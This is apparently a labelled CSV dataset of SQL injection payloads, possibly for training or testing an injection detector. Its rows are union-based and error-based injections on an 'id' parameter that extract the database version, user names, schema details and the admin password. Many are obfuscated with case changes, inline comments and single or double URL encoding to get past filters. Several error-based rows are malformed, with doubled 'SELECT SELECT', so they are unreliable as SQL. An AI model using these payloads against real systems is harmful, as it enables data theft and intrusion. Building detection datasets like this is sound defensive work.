id%253D1%2527%2BUnion%2BsElECT%2Buser%2528%2529%252C%2Bdatabase%2528%2529%252C%2Bversion%2528%2529%2B--,1,sqli_union,case_var|comment_dash_dash,double_encoded,SQLI_UNION_006,6a9a99ef4a08f72fa32d58530b569623,042d6a8b4af25b84bca039bab4278baa,103
"id='%20UniON%20SelECT%20column_name,null%20#",1,sqli_union,case_var|comment_hash|ws_url_space,raw,SQLI_UNION_001,1f35ba741c6f05d2869331f3785d508e,fc3669f26043c681b514cc51bf3228d3,44
id%3D1%27+Union+ALL+SELect+null%2C+1%2C2+FroM+information_schema.columns+%23,1,sqli_union,case_var|comment_hash|ws_space,url_encoded,SQLI_UNION_004,eab001fd5e73e93605fb2f5d5feacf5f,724f6c4712c05adfcba0cc4fee693b2e,76
"id%3D1%27	union	ALL	SELECT	null,	user,password	from	information_schema.tables	%23",1,sqli_union,case_var|comment_url_hash|ws_tab,partially_encoded,SQLI_UNION_004,b21f8bf5ab795a0c3946cb225830feff,4808528631c1281a197b7310311ca5fe,81
id%3D1%27+union+ALL+SELECT+null%2C+table_name%2Ctable_schema+FROM+information_schema.columns+%2F%2A,1,sqli_union,case_var|comment_block_comment,url_encoded,SQLI_UNION_004,8c627f455bba4131468c3ec92720ddf0,b871667e18b5090c9511f464ff56b25b,99
"id=' UNION SELECT 1,2, table_name FROM information_schema.tables %23",1,sqli_union,comment_url_hash,raw,SQLI_UNION_005,887e9a17c47bec279c4567de6182d59a,14ca1708291ed6f5ded0ccd01d05e72b,68
id%253D1%2527%2BUNION%2BSELECT%2Buser%2528%2529%252C%2Bdatabase%2528%2529%252C%2Bversion%2528%2529%2B%2523,1,sqli_union,comment_hash,double_encoded,SQLI_UNION_006,40d2b63ea58f7af7c76b8ea69032aa47,9253ded2ae332fcce6653e80e4e016cd,106
id%253D1%2527%2509UnIon%2509SELECT%2509user%2528%2529%252C%2509database%2528%2529%252C%2509version%2528%2529%2509%252F%252A,1,sqli_union,case_var|comment_block_comment|ws_tab,double_encoded,SQLI_UNION_006,4ceeb3ca110002d1bbdcceae752234ce,e0e29626e559f8793d005115dba4208f,123
"id='	UNION	Select	1,version(),	table_name	frOm	information_schema.tables	/*",1,sqli_union,case_var|comment_block_comment|ws_tab,raw,SQLI_UNION_005,74f30fbc6397585ab15ea94ad12d53a3,4be8ffb43cf156d8d4ea41ee6149defd,75
id%253D-1%2527%2Bunion%2BALL%2Bselect%2B1%252Cversion%2528%2529%2B%252523,1,sqli_union,case_var|comment_url_hash,double_encoded,SQLI_UNION_002,2b645164dd06f92d0ffad6478f834663,09cc3adf9436d10849b699ec4322e134,73
id%253D1%2527%2Bunion%2BALL%2Bselect%2Bnull%252C%2B1%252C2%2BFrom%2Binformation_schema.tables%2B--,1,sqli_union,case_var|comment_dash_dash,double_encoded,SQLI_UNION_004,0ca792dd30d678f82cc63974f9bdb06c,d9bc8cb6e2c487fe988e24310d3888e9,98
"id%3D1%27+UNION+ALL+SELECT+null,+1,version()+FROM+dvwa.users+--",1,sqli_union,comment_dash_dash|ws_plus,partially_encoded,SQLI_UNION_004,4134b02b06f52f41ef3134eca0b6a435,6f75068c8f8eb71880970f6428d103e5,63
id%253D%2527%2509uniOn%2509Select%25091%252C2%252C%2509table_name%2509FROM%2509information_schema.tables%2509--,1,sqli_union,case_var|comment_dash_dash|ws_tab,double_encoded,SQLI_UNION_005,ba447f4fb4159e03168c9fdc06ce627a,151d746471d896c6ff14be2924765881,111
id%3D-1%27+UNION+ALL+SELECT+1%2Cversion%28%29+%2523,1,sqli_union,comment_url_hash,url_encoded,SQLI_UNION_002,668f4024de689c1689ba2dc45f6ee726,b11da1ca6c11d6d9b1e056564a2692ef,51
"id=1'	union	seLECt	user,password	from	information_schema.columns	--	-",1,sqli_union,case_var|comment_dash_dash_space|ws_tab,raw,SQLI_UNION_003,d65bb6def142cf15a9e3e73e8c626001,0179b311fd5973b262b82877df0db24e,69
id%3D-1%27%2BUNION%2BALL%2BSELECT%2B1%2C2%2B%3B--%2B-,1,sqli_union,comment_semicolon_comment|ws_mixed_ws,url_encoded,SQLI_UNION_002,c93fbd4d2076d8a7788545d3dc8faa86,c512162587579668fd0cc46f3eacdf52,53
"id%3D1%27+ UNion  SELECT+ table_name,table_schema+ fRoM  dvwa.users +--+ -",1,sqli_union,case_var|comment_dash_dash_space|ws_multi_space,partially_encoded,SQLI_UNION_003,3bc3621867bcce0e77b83d8af181dce7,fba19bd9a15d6c40d65cd70d85fa4b02,74
id%253D%2527%2BUNION%2Bselect%2B1%252C2%2B%2523,1,sqli_union,case_var|comment_hash,double_encoded,SQLI_UNION_001,d459fc80f408d14e0154b6b267695f69,6833d87f2b02839a91c2b1257c0dc3da,47
"id=1'+UNION+SELECT+column_name,null FROM+information_schema.columns+#",1,sqli_union,comment_hash,partially_encoded,SQLI_UNION_003,c318d3dbe5363dd1d80f17e3c94880ff,c69506953e0d6012a716bd5e5c699419,69
"id=1' UNION ALL+SELECT+null,+column_name,null FROM+information_schema.tables+--+-",1,sqli_union,comment_dash_dash_space,partially_encoded,SQLI_UNION_004,d1477a76a02b1366996961fe01b982ad,f8b1cafbaca2211bf66553cba30c7a57,81
"id='  Union  Select  1,2  #",1,sqli_union,case_var|comment_hash|ws_multi_space,raw,SQLI_UNION_001,838ac0cfe8c13913f8d338c9dd33d093,e2e9e5cdb31b6a3f36235627947c662f,27
"id%3D-1%27 union ALL+Select+user,password+%3B--+-",1,sqli_union,case_var|comment_semicolon_comment,partially_encoded,SQLI_UNION_002,e4c24de0042d4a136c2651bd1ef2bf43,0179fc09e9255131d2d060c8f90aed4a,49
"id=1'%2F%2A%2A/Union/%2A*%2FALL%2F*%2A%2Fselect%2F%2A%2A/null,/**%2Fcolumn_name,null/*%2A%2FFrom/%2A*/information_schema.columns/%2A*%2F%3B--%2F%2A*%2F-",1,sqli_union,case_var|comment_semicolon_comment|ws_comment_ws,partially_encoded,SQLI_UNION_004,5af732882c1c97ee99bd9efa0bc0dfb7,2819d0ef1ea22bd78802546fcc42f27e,152
"id%3D%27/*%2A%2FUNION/%2A%2A%2FSELECT%2F%2A%2A%2F1,2%2F%2A*/%23",1,sqli_union,comment_hash|ws_comment_ws,partially_encoded,SQLI_UNION_001,d86a0f470945b35442637258e9b23c7e,1bc98e86223b66ebd4f9f9cee8ea347b,63
"id%3D%27%2F%2A%2A%2FUNION%2F*%2A/SELECT%2F**%2F1,version()%2F**/;--%2F%2A%2A/-",1,sqli_union,comment_semicolon_comment|ws_mixed_ws,partially_encoded,SQLI_UNION_001,c62c601faf9adc923296d2d9d3496696,266a3889b0271c1dbcafdded82fed983,78
id%253D%2527%252520UNION%252520SELECT%252520table_name%252Ctable_schema%252520%2523,1,sqli_union,comment_hash|ws_url_space,double_encoded,SQLI_UNION_001,815d29d64003fc2286d5df8a812a9a49,5987b58145bd1edee61e363512fb2504,83
id%3D-1%27+union+ALL+select+table_name%2Ctable_schema+--,1,sqli_union,case_var|comment_dash_dash,url_encoded,SQLI_UNION_002,5dfd01e4713fa23d212dde625a70b56a,fa0449732845f00cdcb4fe2974d690f4,56
"id=1' Union ALL select null, column_name,null FROM users --",1,sqli_union,case_var|comment_dash_dash|ws_space,raw,SQLI_UNION_004,81852e2484c1cb90e7c8953ff18a2d92,c446a4c7d82f4765cdc640b7833d0204,59
"id=%27   Union + SELECT+++user,password   --",1,sqli_union,case_var|comment_dash_dash|ws_mixed_ws,partially_encoded,SQLI_UNION_001,bb54043a65eea860f7d06069c14e7b82,60bd6fb5ddb15d35d1000a3415df4cbe,44
"id%3D-1%27+UNIon+ALL+select 1,2+%23",1,sqli_union,case_var|comment_url_hash,partially_encoded,SQLI_UNION_002,3e66bd984232533e31cd910fa2ee172c,e690674db9c5a4167dbdea7b74b84be2,35
id%3D1%27+UNIon+ALL+select+null%2C+column_name%2Cnull+from+information_schema.tables+%23,1,sqli_union,case_var|comment_hash,url_encoded,SQLI_UNION_004,a961547fd343fa49bb1d8657a6f666c2,db168209bd293197b810dc556e98f4cc,88
id%253D-1%2527%2BUNION%2BALL%2BSELECT%2Btable_name%252Ctable_schema%2B%2523,1,sqli_union,comment_hash,double_encoded,SQLI_UNION_002,99a6ae2c1671f75f1c628478b31217b1,42680cf58de14bf7a80584df65d6a3cf,75
id%253D1%2527%2509union%2509Select%25091%252Cversion%2528%2529%2509from%2509information_schema.tables%2509%253B--%2509-,1,sqli_union,case_var|comment_semicolon_comment|ws_tab,double_encoded,SQLI_UNION_003,24bbb9be3444ae0714ccbd55408e88ba,2076bf786a7695d6cc8ec73f51b1aad5,119
"id=1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",1,sqli_error,comment_dash_dash,raw,SQLI_ERROR_001,b2c0abe875d2ec9572745f253af8ddd3,a1af6c47d5b29d936c4135c99c1fecb7,134
id%253D1%2527%2BAND%2BCASE%2BWHEN%2B%25282%253E1%2529%2BTHEN%2B1%252F0%2BELSE%2B1%2BEND%2B%253B--%2B-,1,sqli_error,comment_semicolon_comment|ws_space,double_encoded,SQLI_ERROR_004,7a15476d049458e01174c2b397f73d07,fe90dc2936b7fbfa0f2c4d170e077a7b,101
id%253D1%2527%252F%252A%252A%252FAnd%252F%252A%252A%252F%2528SELECT%252F%252A%252A%252F1%252F%252A%252A%252FFROM%252F%252A%252A%252F%2528SELECT%252F%252A%252A%252FCOUNT%2528%252A%2529%252CCONCAT%2528%2528SELECT%252F%252A%252A%252Fdatabase%2528%2529%2529%252CFLOOR%2528RAND%25280%2529%252A2%2529%2529x%252F%252A%252A%252Ffrom%252F%252A%252A%252Finformation_schema.tables%252F%252A%252A%252FGROUP%252F%252A%252A%252FBY%252F%252A%252A%252Fx%2529a%2529%252F%252A%252A%252F%252523,1,sqli_error,case_var|comment_url_hash|ws_comment_ws,double_encoded,SQLI_ERROR_001,2e6ae318e0f1eca1102d5d825e7ead01,cc58dd9420566f0c9aa72a354abb2d8c,475
id%3D1%27++And++EXTRACTVALUE%281%2C++CONCAT%280x7e%2C++%28SELECT++password++from++users++WHeRe++user%3D%27admin%27%29%29%29++%2F%2A,1,sqli_error,case_var|comment_block_comment|ws_multi_space,url_encoded,SQLI_ERROR_002,5ef921135b2c6000fdca8d51a82c8c9a,82be6f615c77283856259334dbc2fe20,131
"id=1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x From information_schema.tables GROUP BY x)a) --",1,sqli_error,case_var|comment_dash_dash,raw,SQLI_ERROR_001,61bccd1a0e933a6aa9cee70a8080b324,74d516ab6ed3a0b6781cc64087ef4949,135
id=1'  And  CASE  wheN  ('a'='a')  tHEN  1/0  Else  1  eNd  ;--  -,1,sqli_error,case_var|comment_semicolon_comment|ws_multi_space,raw,SQLI_ERROR_004,33a569bf5b206a6fa015d214e33c9b13,12d0c8e1618d2629a6d119b2c032ce84,66
id%3D1%27+AND+EXP%28~%28SELECT+%2A+FROM+%28SELECT+SELECT+user%28%29%29a%29%29+%2523,1,sqli_error,comment_url_hash,url_encoded,SQLI_ERROR_005,640af2ccb5a1ec6351db1508859c2d65,0d25fbef78dbda29f6c8381a8ae70155,83
id=1' AND EXP(~(SELECT * FROM (SELECT SELECT password FROM users WHERE user='admin')a)) -- -,1,sqli_error,comment_dash_dash_space,raw,SQLI_ERROR_005,5ddd47c51ab61827267244189bfa606e,22f250cf03811af8df6a173004330bc4,92
id%253D1%2527%2BAND%2BEXTRACTVALUE%25281%252C%2BCONCAT%25280x7e%252C%2B%2528SELECT%2Bdatabase%2528%2529%2529%2529%2529%2B--%2B-,1,sqli_error,comment_dash_dash_space,double_encoded,SQLI_ERROR_002,974f0c57e19a25264f0a4356bc86b50c,75f9d5461fccadbadc533b74b9c84a2f,127
id%253D1%2527%252520And%252520EXP%2528~%2528SELECT%252520%252A%252520From%252520%2528SELECT%252520sElEcT%252520password%252520From%252520users%252520Where%252520user%253D%2527admin%2527%2529a%2529%2529%252520%253B--%252520-,1,sqli_error,case_var|comment_semicolon_comment|ws_url_space,double_encoded,SQLI_ERROR_005,b3bfe0c2883bab454fb86ab69377ad64,91a8771e71a4ea3b0d42d054865ff527,223
id=1' AND Case When (LENGTH('test')=4) THEN 1/0 ELSE 1 End #,1,sqli_error,case_var|comment_hash,raw,SQLI_ERROR_004,a94145c9c1e688acb8d93d889b76a35f,192084d826fcc3672d71b09b837b0a49,60
id%3D1'+and+case+when+(1%3D1)+Then+1%2F0+ELSE+1+END+%2F*,1,sqli_error,case_var|comment_block_comment|ws_mixed_ws,partially_encoded,SQLI_ERROR_004,48be733b4814293b999f4c59b76e365a,dcfae31d59c906e62d04d7cbb0c40897,56
id=1'+And+CAsE+WHEN+(2>1)+then+1/0+ELSE+1+END+/*,1,sqli_error,case_var|comment_block_comment|ws_plus,raw,SQLI_ERROR_004,823cd3529411f4f950d4570af6f56031,7930e82929435c2ca14ee7577e672314,48
id%3D1%27++AND++EXP%28~%28SELECT++%2A++FROM++%28SELECT++SELECT++user%28%29%29a%29%29++%2523,1,sqli_error,comment_url_hash|ws_multi_space,url_encoded,SQLI_ERROR_005,4d8e0082208c00e2526fd32aa6d9819e,50d72ef1686467dc7ac4cb57b8107291,91
id%3D1%27+and+EXP%28~%28SELECT+%2A+from+%28SELECT+SELECT+user%28%29%29a%29%29+--,1,sqli_error,case_var|comment_dash_dash,url_encoded,SQLI_ERROR_005,6f867186620dda9458b803e7d083d5d1,9c9e17a44f69467fb5cc4ac832cd9c77,80
id%3D1%27+AND+Case+WHEN+%281%3D1%29+tHEN+1%2F0+ElsE+1+end+%2F%2A,1,sqli_error,case_var|comment_block_comment,url_encoded,SQLI_ERROR_004,8ecd914e36a699b5e20f60e384b5d4e8,1c189e37a985a74e214e322e5fe475f7,64
"id%3D1%27 AND EXTRACTVALUE(1,+CONCAT(0x7e,+(SELECT user())))+%2F%2A",1,sqli_error,comment_block_comment,partially_encoded,SQLI_ERROR_002,625985222e85df3eb70adba151da2ca9,8b73e9170ea3f582021cbb2d5c511b8c,67
id=1'   AND   EXP(~(SELECT   *   FROM   (SELECT   SELECT   password   FROM   users   WHERE   user='admin')a))   #,1,sqli_error,comment_hash|ws_mixed_ws,raw,SQLI_ERROR_005,da24178d2f93a1740fc7e850046ba2c7,6825870d8003c106ba8156ff3dbad4a3,113
id%253D1%2527%252BaND%252BEXP%2528~%2528SELECT%252B%252A%252BfRoM%252B%2528SELECT%252BSELECT%252Bdatabase%2528%2529%2529a%2529%2529%252B--,1,sqli_error,case_var|comment_dash_dash|ws_plus,double_encoded,SQLI_ERROR_005,c5a4c8633125651fecfde8e28d74919f,69a686a157fff33b3231e0721d8990a4,138
id%3D1%27%2Band%2B%28SELECT%2B1%2BFrom%2B%28SELECT%2BCOUNT%28%2A%29%2CCONCAT%28%28SELECT%2Bdatabase%28%29%29%2CFLOOR%28RAND%280%29%2A2%29%29x%2BFRom%2Binformation_schema.tables%2BGROUP%2BBY%2Bx%29a%29%2B%3B--%2B-,1,sqli_error,case_var|comment_semicolon_comment|ws_mixed_ws,url_encoded,SQLI_ERROR_001,5dc0706761f66e5119b77d8486811e0a,934ccc0553dfb311caf4d0ea7ea656ad,212
id=1' And cASe WHEn ('a'='a') tHEN 1/0 ELSE 1 End %23,1,sqli_error,case_var|comment_url_hash,raw,SQLI_ERROR_004,49bc1c986c621dc6a9e1c2f796246b6c,f8f3d62bc220c3474009a3f359056c8a,53
id%253D1%2527%2509AND%2509EXP%2528~%2528SELECT%2509%252A%2509FROM%2509%2528SELECT%2509select%2509password%2509From%2509users%2509WheRe%2509user%253D%2527admin%2527%2529a%2529%2529%2509%252F%252A,1,sqli_error,case_var|comment_block_comment|ws_tab,double_encoded,SQLI_ERROR_005,73c06ce7dee1c2b0b83a729583e2a9af,5ca595354b793317102d46a6ba8ba7df,194
id%253D1%2527%2BaNd%2BCASE%2BwHen%2B%25287%253D7%2529%2Bthen%2B1%252F0%2Belse%2B1%2BEND%2B%2523,1,sqli_error,case_var|comment_hash,double_encoded,SQLI_ERROR_004,de7c489090c49d572421780cf2fc5571,08cce42f6488a3720a690b429dd91a4d,95
"id=1'+AND+UPDATEXML(1,+CONCAT(0x7e,+(SELECT+version())),+1)+--",1,sqli_error,comment_dash_dash|ws_plus,raw,SQLI_ERROR_003,f4835ca1fb8f6d672a9425cd1e39a53a,1472fa85cd40e344e8f782fbc98cd66f,62
"id=1'/%2A*/AND%2F%2A*%2FUPDATEXML(1,%2F%2A%2A%2FCONCAT(0x7e,/**%2F(SELECT%2F%2A*%2Fversion())),/%2A%2A%2F1)%2F%2A%2A%2F%2F*",1,sqli_error,comment_block_comment|ws_comment_ws,partially_encoded,SQLI_ERROR_003,ffbcbaee9c5839da3cb5506da353d3cc,c72f8f4621f23bd08367adc97f947ff9,123
id=1'  and  CaSE  wHeN  (LENGTH('test')=4)  Then  1/0  ELSE  1  end  /*,1,sqli_error,case_var|comment_block_comment|ws_multi_space,raw,SQLI_ERROR_004,9789a9681b75780483d597d82861d00f,6a85cf86148c33ff7b0a7c6416437c62,71
id%3D1%27+And+Case+When+%281%3D1%29+thEN+1%2F0+ELSE+1+End+--+-,1,sqli_error,case_var|comment_dash_dash_space|ws_space,url_encoded,SQLI_ERROR_004,a5f04f9b8e0e968c75531e4b13b95a44,5e15c88b191cfd7716849e838c2d04f1,62
id%253D1%2527%2BAND%2BUPDATEXML%25281%252C%2BCONCAT%25280x7e%252C%2B%2528SELECT%2Bpassword%2BFROM%2Busers%2BWHERE%2Buser%253D%2527admin%2527%2529%2529%252C%2B1%2529%2B%2523,1,sqli_error,comment_hash,double_encoded,SQLI_ERROR_003,d0179853f81666623f894ba0c46b32ac,801e93964befd9748c2ca2bce58d3861,172
id%3D1%27+AND+%28SELECT+1+FROM+%28SELECT+COUNT%28%2A%29%2CCONCAT%28%28SELECT+database%28%29%29%2CFLOOR%28RAND%280%29%2A2%29%29x+FROM+information_schema.tables+GROUP+BY+x%29a%29+%3B--+-,1,sqli_error,comment_semicolon_comment,url_encoded,SQLI_ERROR_001,59f086c929e7bb3598f4bba6f443cd94,548ae753f82ab7f9d52d56d561c567c7,184
id%253D1%2527%2BAND%2B%2528SELECT%2B1%2BFROM%2B%2528SELECT%2BCOUNT%2528%252A%2529%252CCONCAT%2528%2528SELECT%2Buser%2528%2529%2529%252CFLOOR%2528RAND%25280%2529%252A2%2529%2529x%2BFROM%2Binformation_schema.tables%2BGROUP%2BBY%2Bx%2529a%2529%2B%252523,1,sqli_error,comment_url_hash,double_encoded,SQLI_ERROR_001,445472a28de1a419d3217e0bfed84590,8be4458733443018f58f7ab1d06f3fa0,250
id%3D1%27%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%281%2C%2F%2A%2A%2FCONCAT%280x7e%2C%2F%2A%2A%2F%28SELECT%2F%2A%2A%2Fuser%28%29%29%29%29%2F%2A%2A%2F%3B--%2F%2A%2A%2F-,1,sqli_error,comment_semicolon_comment|ws_comment_ws,url_encoded,SQLI_ERROR_002,f086bc5aed1d7eab9ad149b7eac10a4a,ea6884335566362749a63086291fa193,165
id%253D1%2527%252BAND%252BUPDATEXML%25281%252C%252BCONCAT%25280x7e%252C%252B%2528SELECT%252Bdatabase%2528%2529%2529%2529%252C%252B1%2529%252B%253B--%252B-,1,sqli_error,case_var|comment_semicolon_comment|ws_plus,double_encoded,SQLI_ERROR_003,6e55ee38c30f42fd0a8c1e17c7413c3e,aca79cd8bf836eb790ceb4b905fbb5fc,154
"id%3D1'%20AND%20EXTRACTVALUE(1,%20CONCAT(0x7e,%20(SELECT%20user())))%20;--%20-",1,sqli_error,comment_semicolon_comment|ws_url_space,partially_encoded,SQLI_ERROR_002,51751fa1f75a90c45ae210faa686b692,60aa9f256a8ad007b1ca59e10e573ae7,78
id%3D1%27%2F%2A%2A%2FaND%2F%2A%2A%2FEXP%28~%28SELECT%2F%2A%2A%2F%2A%2F%2A%2A%2Ffrom%2F%2A%2A%2F%28SELECT%2F%2A%2A%2Fselect%2F%2A%2A%2Fversion%28%29%29a%29%29%2F%2A%2A%2F%23,1,sqli_error,case_var|comment_hash|ws_comment_ws,url_encoded,SQLI_ERROR_005,2f08c811bfc0fc7dd7e5e0f5c08fc3bb,1c83723677491df63894c81c16db36b8,172
id%253D1%2527%2BAND%2BEXTRACTVALUE%25281%252C%2BCONCAT%25280x7e%252C%2B%2528SELECT%2Bdatabase%2528%2529%2529%2529%2529%2B%2523,1,sqli_error,comment_hash,double_encoded,SQLI_ERROR_002,dda80576f31e8f9347488b43c2099b2c,cd086b1589dd16cc688e1af0d375f316,126
id%253D1%2527%2BAND%2BCASE%2BWHEN%2B%25287%253D7%2529%2BTHEN%2B1%252F0%2BELSE%2B1%2BEND%2B--%2B-,1,sqli_error,comment_dash_dash_space,double_encoded,SQLI_ERROR_004,a86116723778347fb1e31b876513f00f,388e403530d624f69feb80f0ada15132,96
id%253D1%2527%2509and%2509EXTRACTVALUE%25281%252C%2509CONCAT%25280x7e%252C%2509%2528SELECT%2509password%2509From%2509users%2509WHERE%2509user%253D%2527admin%2527%2529%2529%2529%2509--,1,sqli_error,case_var|comment_dash_dash|ws_tab,double_encoded,SQLI_ERROR_002,4a09d6f7a74c18696771fa25a5c0bd70,a2f3bdf2d8c2cfc087d368ca7b2f71cd,183
id%3D1%27+AND+%28SELECT+1+FROM+%28SELECT+COUNT%28%2A%29%2CCONCAT%28%28SELECT+version%28%29%29%2CFLOOR%28RAND%280%29%2A2%29%29x+FROM+information_schema.tables+GROUP+BY+x%29a%29+--+-,1,sqli_error,comment_dash_dash_space,url_encoded,SQLI_ERROR_001,94f159668080ff31b9ace0408fcc9822,53d573efa376e83701c970a684c87441,180
id%3D1%27%2BAND%2BEXTRACTVALUE%281%2C%2BCONCAT%280x7e%2C%2B%28SELECT%2Bversion%28%29%29%29%29%2B%2F%2A,1,sqli_error,case_var|comment_block_comment|ws_plus,url_encoded,SQLI_ERROR_002,965ff03ae9d554c85aa7c1dd8d6cb6f0,98005732da1eef31d07729ee55498f69,102
id%253D1%2527%252520AND%252520UPDATEXML%25281%252C%252520CONCAT%25280x7e%252C%252520%2528SELECT%252520database%2528%2529%2529%2529%252C%2525201%2529%252520%253B--%252520-,1,sqli_error,comment_semicolon_comment|ws_url_space,double_encoded,SQLI_ERROR_003,9da02271fba40915d9e994ae4751a5e5,87167492f5164d10add50471fb28e7e2,170
id%253D1%2527%252F%252A%252A%252FaNd%252F%252A%252A%252FCASE%252F%252A%252A%252FWHEn%252F%252A%252A%252F%2528LENGTH%2528%2527test%2527%2529%253D4%2529%252F%252A%252A%252FTheN%252F%252A%252A%252F1%252F0%252F%252A%252A%252FELSE%252F%252A%252A%252F1%252F%252A%252A%252Fend%252F%252A%252A%252F%252F%252A,1,sqli_error,case_var|comment_block_comment|ws_comment_ws,double_encoded,SQLI_ERROR_004,0de58f4cac07b2ebfa8928d729d7b220,65217316653502fff5e4b02efdbfd1f3,299
id%3D1%27%2520and%2520CASE%2520When%2520%28CHAR%2897%29%3D%27a%27%29%2520THEN%25201%2F0%2520ELSE%25201%2520END%2520%23,1,sqli_error,case_var|comment_hash|ws_url_space,url_encoded,SQLI_ERROR_004,736619480499e0c4a45f716a35c707eb,fb28ec3c4ca22b02c2492c550f36ea54,118
id%253D1%2527%2B%2BanD%2B%2BCASE%2B%2BWHEN%2B%2B%25281%253D1%2529%2B%2BThen%2B%2B1%252F0%2B%2Belse%2B%2B1%2B%2BEnd%2B%2B%252523,1,sqli_error,case_var|comment_url_hash|ws_multi_space,double_encoded,SQLI_ERROR_004,1ab4da8891d278d4953201d1c33bfb07,b26337179fb8a9b63ba57c72df60772b,127
id%253D1%2527%252BAND%252BUPDATEXML%25281%252C%252BCONCAT%25280x7e%252C%252B%2528SELECT%252Buser%2528%2529%2529%2529%252C%252B1%2529%252B--,1,sqli_error,comment_dash_dash|ws_plus,double_encoded,SQLI_ERROR_003,4245ac811d55b0c691654945ce9e460e,93a797c18637294bc9d50835adc1cb78,139
id%3D1%27+And+UPDATEXML%281%2C+CONCAT%280x7e%2C+%28SELECT+password+From+users+WhERe+user%3D%27admin%27%29%29%2C+1%29+%2F%2A,1,sqli_error,case_var|comment_block_comment,url_encoded,SQLI_ERROR_003,8ac3f85a8074d21eb30889d0124de6c8,626ca8985dd274187f9ef4784b33828d,123
"id=1'/**/And/**/UPDATEXML(1,/**/CONCAT(0x7e,/**/(SELECT/**/user())),/**/1)/**/;--/**/-",1,sqli_error,case_var|comment_semicolon_comment|ws_comment_ws,raw,SQLI_ERROR_003,219c83701c30465dffb2f066606ef13c,95c8bf26473d182230aca4499849bc9d,86
id%3D1%27+And+%28SELECT+1+from+%28SELECT+COUNT%28%2A%29%2CCONCAT%28%28SELECT+user%28%29%29%2CFLOOR%28RAND%280%29%2A2%29%29x+From+information_schema.tables+GROUP+BY+x%29a%29+%2F%2A,1,sqli_error,case_var|comment_block_comment|ws_space,url_encoded,SQLI_ERROR_001,55442133897bab990324a0a0216c6a14,b54b096464793d14490454c774b5fdc4,179
"id=1'%20and%20EXTRACTVALUE(1,%20CONCAT(0x7e,%20(SELECT%20user())))%20#",1,sqli_error,case_var|comment_hash|ws_mixed_ws,raw,SQLI_ERROR_002,df3c8c9a8a7a6a67465ddabe7780f85a,cf8aa975dc42e43a396047946a3463b0,70
id%3D1%27%2BAnd%2BEXTRACTVALUE%281%2C%2BCONCAT%280x7e%2C%2B%28SELECT%2Bpassword%2BFROM%2Busers%2Bwhere%2Buser%3D%27admin%27%29%29%29%2B%3B--%2B-,1,sqli_error,case_var|comment_semicolon_comment|ws_plus,url_encoded,SQLI_ERROR_002,f97b4057d59a462f2624f2a37ff646c4,54ed664eac904a1fd50ec044bba355cd,144
id%3D1' AND+case+WHen (LENGTH(%27test%27)%3D4)+then 1/0 else 1+end+--,1,sqli_error,case_var|comment_dash_dash,partially_encoded,SQLI_ERROR_004,c6ba72772ec9a5b436f601383d892285,53c1b2b5baa69672ae1140383998bfff,69
"id=1'%20And%20(SELECT%201%20FROM%20(SELECT%20COUNT(*),CONCAT((SELECT%20version()),FLOOR(RAND(0)*2))x%20from%20information_schema.tables%20GROUP%20BY%20x)a)%20--",1,sqli_error,case_var|comment_dash_dash|ws_mixed_ws,raw,SQLI_ERROR_001,6523b6e9db09e27f1c2d4de6e6924d3a,f450fdaa68225a3bbf0302931e6770b8,160
"id=1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT user()))) /*",1,sqli_error,comment_block_comment,raw,SQLI_ERROR_002,85588895bf903a47e979829a35925626,2b17e8b836a419561c4b4be09fcd7681,59
id%253D1%2527%2Band%2BUPDATEXML%25281%252C%2BCONCAT%25280x7e%252C%2B%2528SELECT%2Bpassword%2Bfrom%2Busers%2BWhere%2Buser%253D%2527admin%2527%2529%2529%252C%2B1%2529%2B--,1,sqli_error,case_var|comment_dash_dash,double_encoded,SQLI_ERROR_003,db2210125faff9f163cb77adbcca5989,65e9698074a616b0721f1a261cebacb9,169
"id=1'++AND+ EXTRACTVALUE(1, +CONCAT(0x7e,  (SELECT+ password++FROM  users++WHERE +user%3D'admin%27)))  #",1,sqli_error,comment_hash|ws_multi_space,partially_encoded,SQLI_ERROR_002,38d9864862f92edd260163d51382d04e,89905e22c8a4ee1b386b23b4b18a612f,104
id%253D1%2527%2509AND%2509%2528SELECT%25091%2509FROM%2509%2528SELECT%2509COUNT%2528%252A%2529%252CCONCAT%2528%2528SELECT%2509password%2509FROM%2509users%2509WHERE%2509user%253D%2527admin%2527%2529%252CFLOOR%2528RAND%25280%2529%252A2%2529%2529x%2509FROM%2509information_schema.tables%2509GROUP%2509BY%2509x%2529a%2529%2509%253B--%2509-,1,sqli_error,comment_semicolon_comment|ws_tab,double_encoded,SQLI_ERROR_001,ffef0d081df5199ed6b5af4f875fc60b,d690ff049bdff21dac3de7799be65fcc,334
id%253D1%2527%2BAND%2BUPDATEXML%25281%252C%2BCONCAT%25280x7e%252C%2B%2528SELECT%2Buser%2528%2529%2529%2529%252C%2B1%2529%2B%252523,1,sqli_error,case_var|comment_url_hash,double_encoded,SQLI_ERROR_003,367555c8ea4d03fdad4e21f5b4cf6dc3,aa5c380f790b49a62066a34824e1eaa9,130
id%253D1%2527%252520AND%252520EXP%2528~%2528SELECT%252520%252A%252520From%252520%2528SELECT%252520SELECT%252520database%2528%2529%2529a%2529%2529%252520--,1,sqli_error,case_var|comment_dash_dash|ws_url_space,double_encoded,SQLI_ERROR_005,c4b911a325731aa158b3f44dd64afe26,28347fd74b6d17579c9ba8d50d37db6e,154
id=1'  AND  EXP(~(SELECT  *  FROM  (SELECT  SELECT  database())a))  ;--  -,1,sqli_error,comment_semicolon_comment|ws_multi_space,raw,SQLI_ERROR_005,99660c620709c8d9987872dc564efd7e,64f5e31f56405f789edb6c948a75fbb4,74
"id=1'/**/AND/**/UPDATEXML(1,/**/CONCAT(0x7e,/**/(SELECT/**/version())),/**/1)/**/--/**/-",1,sqli_error,comment_dash_dash_space|ws_comment_ws,raw,SQLI_ERROR_003,4b856ce7fb1e98d2f158e448b5b3413d,4c662416648793a46b913e1959a7a7d0,88
id%253D1%2527%252F%252A%252A%252FAND%252F%252A%252A%252FEXTRACTVALUE%25281%252C%252F%252A%252A%252FCONCAT%25280x7e%252C%252F%252A%252A%252F%2528SELECT%252F%252A%252A%252Fdatabase%2528%2529%2529%2529%2529%252F%252A%252A%252F--,1,sqli_error,comment_dash_dash|ws_comment_ws,double_encoded,SQLI_ERROR_002,75ec84629b9edd40495a3057e12daef0,b17be6e5e18018e3e73e7957a1d11ab3,225
